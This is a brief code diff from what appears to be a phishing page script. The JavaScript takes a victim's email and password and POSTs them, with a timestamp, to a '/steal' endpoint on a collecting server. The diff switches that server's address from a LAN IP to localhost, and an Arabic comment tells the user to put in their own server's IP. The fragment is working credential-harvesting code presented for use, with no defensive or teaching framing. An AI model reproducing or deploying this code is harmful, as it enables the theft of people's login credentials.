@@ -21,7 +21,7 @@
 
       console.log("Sending data:", { email, password });
 
-      fetch('http://192.168.1.2:3000/steal', {  // غير الـ IP لـ IP جهازك اللي شغال عليه السيرفر
+      fetch('http://localhost:3000/steal', {  // غير الـ IP لـ IP جهازك اللي شغال عليه السيرفر
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({ email, password, timestamp: new Date().toISOString() })
